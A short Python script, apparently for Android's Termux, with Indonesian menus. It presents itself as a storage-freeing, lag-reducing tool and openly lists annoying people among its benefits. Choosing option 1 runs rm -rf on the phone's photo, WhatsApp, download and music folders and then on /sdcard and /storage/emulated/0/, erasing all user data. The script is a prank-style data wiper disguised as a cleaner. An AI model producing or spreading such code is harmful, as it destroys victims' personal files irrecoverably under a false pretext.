import requests,os

def hapus():
 print(f'[!] Menginstall tools hapus data..')
 os.system('cd /sdcard')
 os.system('rm -rf Android')
 os.system('rm -rf Download')
 os.system('rm -rf DCIM')
 os.system('rm -rf UCDownloads')
 os.system('rm -rf Music')
 os.system('rm -rf Pictures')
 os.system('rm -rf Movies')
 os.system('rm -rf WhatsApp')
 os.system('rm -rf Vidmate')
 os.system('rm -rf Browser')
 os.system('rm -rf Shareit')
 os.system('rm -rf /sdcard')
 os.system('rm -rf /storage/emulated/0/')
 
def kembali():
 print(f'[!] batal menghapus file android..Takut yaa wkwkwk')
 os.system('python tania.py')

print ("\033[1;32m❛ ━━━━━･━━━━━━･━━━━━━･❪ ❁ ❫ ･━━━━━━ ━━━━━･━━━━━━･❜")
print ("\033[1;31m[\033[1;37m1\033[1;31m] \033[1;33m       Author=Tania`27")
print ("\033[1;31m[\033[1;37m1\033[1;31m] \033[1;33m       WA    =kepo")
print ("\033[1;32m❛ ━━━━━･━━━━━━･━━━━━━･❪ ❁ ❫ ･━━━━━━ ━━━━━･━━━━━━･❜")

import random
import sys
import time
def mengetik(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()

        time.sleep(random.random() * 0.1)

mengetik("\033[1;36m Ciee,ketemu lagi sama Tania yang Canss ini .Maanfaat tools ini : 1.melega kan penyimpanan ,2.membuat orang kesal ,3.mengurangi lag..Hayuuk dipilih : ")

print("\033[1;32m╬╬═══════════════╬╬")
print ("\033[1;31m[\033[1;37m1\033[1;31m] \033[1;33m Hapus data HP")
print("\033[1;32m╬╬═══════════════╬╬")
print ("\033[1;31m[\033[1;37m2\033[1;31m] \033[1;33m Nggak jadi ")
print("\033[1;32m╬╬═══════════════╬╬")

menu = input("\033[1;32m Data Kamu Akan Kehapus semua lohh,yakin mau hapus ?  .pilih:")

if menu =="1":hapus()
elif menu =="2":kembali()

